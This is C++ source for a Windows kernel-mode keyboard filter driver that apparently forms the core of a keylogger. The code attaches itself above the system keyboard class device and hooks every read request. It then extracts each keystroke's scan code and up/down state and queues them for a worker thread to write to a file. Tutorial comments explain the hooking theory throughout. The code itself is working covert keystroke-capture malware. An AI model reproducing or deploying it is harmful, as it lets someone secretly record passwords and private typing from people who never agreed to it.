extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"


extern numPendingIrps;

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// THE THEORY BEHIND THE HOOK:
// 1. The Operating System sends an empty IRP packet down the device stack for the keyboard.
//
// 2. The IRP is intercepted by the ReadDispatcher routine in the filter driver. While in
//	  this routine, the IRP is "tagged" with a "completion routine".  This is a callback routine 
//	  which basically says "I want another go at this packet later when its got some data".
//	  ReadDispatcher then sends the IRP on it's down the device stack to the drivers underneath.
//
// 3. When the tagged, empty IRP reaches the bottom of the stack at the hardware / software 
//	  interface, it waits for a keypress.
//
// 4. When a key on the keyboard is pressed, the IRP is filled with the scan code for the 
//	  pressed key and sent on its way back up the device stack.
//
// 5. On its way back up the device stack, the completion routines that the IRP was tagged
//    with on its way down the stack are called and the IRP is packed passed into them. This 
//    gives the filter driver an opportunity to extract the scan code information stored 
//	  in the packet from the user's key press.
//
// NOTE: Other IRPs other than IRP_MJ_READ are simply passed down to the drivers underneath
//		without modification.
//
//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
//	__asm int 3;
	DbgPrint("Entering Hook Routine...\n");
	
	//the filter device object
	PDEVICE_OBJECT pKeyboardDeviceObject;
	
	//Create a keyboard device object
	NTSTATUS status = IoCreateDevice(pDriverObject,sizeof(DEVICE_EXTENSION), NULL, //no name
		FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardDeviceObject);

	//Make sure the device was created ok
	if(!NT_SUCCESS(status))
		return status;
	
	DbgPrint("Created keyboard device successfully...\n");

	//////////////////////////////////////////////////////////////////////////////////
	//Copy the characteristics of the target keyboard driver into the  filter device 
	//object because we have to mirror the keyboard device underneath us.
	//These characteristics can be determined by examining the target driver using an
	//application like DeviceTree in the DDK
	//////////////////////////////////////////////////////////////////////////////////
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	DbgPrint("Flags set succesfully...\n");

	//////////////////////////////////////////////////////////////////////////////////////////////
	//Initialize the device extension - The device extension is a custom defined data structure
	//for our driver where we can store information which is guaranteed to exist in nonpaged memory.
	///////////////////////////////////////////////////////////////////////////////////////////////
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	DbgPrint("Device Extension Initialized...\n");

	//Get the pointer to the device extension
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension; 
	
	//////////////////////////////////////////////////////////////////////////////////////////////
	//Insert the filter driver onto the device stack above the target keyboard driver underneath and
	//save the old pointer to the top of the stack. We need this address to direct IRPS to the drivers
	//underneath us on the stack.
	///////////////////////////////////////////////////////////////////////////////////////////////
	CCHAR		 ntNameBuffer[64] = "\\Device\\KeyboardClass0";
    STRING		 ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &uKeyboardDeviceName, &ntNameString, TRUE );
	IoAttachDevice(pKeyboardDeviceObject,&uKeyboardDeviceName,&pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);
	DbgPrint("Filter Device Attached Successfully...\n");

	return STATUS_SUCCESS;
}//end HookKeyboard



/*****************************************************************************************************
// This is the acutal hook routine which we will redirect the keyboard's read IRP's to
//
// NOTE: The DispatchRead, DispatchWrite, and DispatchDeviceControl routines of lowest-level device 
// drivers, and of intermediate drivers layered above them in the system paging path, can be called at 
// IRQL = APC_LEVEL and in an arbitrary thread context. The DispatchRead and/or DispatchWrite routines,
// and any other routine that also processes read and/or write requests in such a lowest-level device 
// or intermediate driver, must be resident at all times. These driver routines can neither be pageable 
// nor be part of a driver's pageable-image section; they must not access any pageable memory. Furthermore,
// they should not be dependent on any blocking calls (such as KeWaitForSingleObject with a nonzero
// time-out). 
*******************************************************************************************************/
//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = DISPATCH_LEVEL
//@@@@@@@@@@@@@@@@@@@@@@@@@
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	
	/////////////////////////////////////////////////////////////////////////
	//NOTE: The theory is that empty keyboard IRP's are sent down through
	//the device stack where they wait until a key is pressed. The keypress
	//completes the IRP. It is therefore necessary to capture the empty
	//IRPS on the way down to the keyboard and "tag" them with a callback
	//function which will be called whenever a key is pressed and the IRP is
	//completed. We "tag" them by setting a "completion routine" using the
	//kernel API IoSetCompletionRoutine
	////////////////////////////////////////////////////////////////////////
	DbgPrint("Entering DispatchRead Routine...\n");
	
	//Each driver that passes IRPs on to lower drivers must set up the stack location for the 
	//next lower driver. A driver calls IoGetNextIrpStackLocation to get a pointer to the next-lower
	//driver’s I/O stack location
	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	//Set the completion callback
	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	//track the # of pending IRPs
	 numPendingIrps++;

	DbgPrint("Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");

	//Pass the IRP on down to the driver underneath us
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);

}//end DispatchRead



//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = DISPATCH_LEVEL
//@@@@@@@@@@@@@@@@@@@@@@@@@
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	DbgPrint("Entering OnReadCompletion Routine...\n");

	//get the device extension - we'll need to use it later
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension; 
	
	//if the request has completed, extract the value of the key
	if(pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for(int i = 0; i < numKeys; i++)
		{
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
			
			if(keys[i].Flags == KEY_BREAK)
				DbgPrint("%s\n","Key Up");
			
			if(keys[i].Flags == KEY_MAKE)
				DbgPrint("%s\n","Key Down");
		
			//////////////////////////////////////////////////////////////////
			// NOTE: The file I/O routines must run at IRQL = PASSIVE_LEVEL
			// and Completion routines can be called at IRQL = DISPATCH_LEVEL.
			// Deferred Procedure Calls also run at IRQL = DISPATCH_LEVEL. This
			// makes it necessary for us to set up and signal a worker thread
			// to write the data out to disk. The worker threads run at IRQL_
			// PASSIVE level so we can do the file I/O from there.
			/////////////////////////////////////////////////////////////////
			
			////////////////////////////////////////////////////////////////
			// Here we allocate a block of memory to hold the keyboard scan
			// code at attach it to an interlocked linked list.  The interlocked
			// list provides synchronized access to the list by using a 
			// spin lock (initialized in DriverEntry).  Also, note that because
			// we are running at IRQL_DISPATCH level, any memory allocation
			// must be done from the non paged pool. 
			///////////////////////////////////////////////////////////////

			///////////////////////////////////////////////////////////////
			// Allocate Memory
			// NOTE: Direct allocation of these small blocks will eventually
			// fragment the non paged pool. A better memory management stragegy
			// would be to allocate memory using a non paged lookaside list.
			//////////////////////////////////////////////////////////////////

			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));
							
			//fill in kData structure with info from IRP
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;

			//Add the scan code to the linked list queue so our worker thread
			//can write it out to a file.
			DbgPrint("Adding IRP to work queue...");
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
			&kData->ListEntry,
			&pKeyboardDeviceExtension->lockQueue);

			//Increment the semaphore by 1 - no WaitForXXX after this call
			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,FALSE);

		}//end for
	}//end if

	//Mark the Irp pending if necessary
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//Remove the Irp from our own count of tagged (pending) IRPs
	 numPendingIrps--;

	return pIrp->IoStatus.Status;
}//end OnReadCompletion

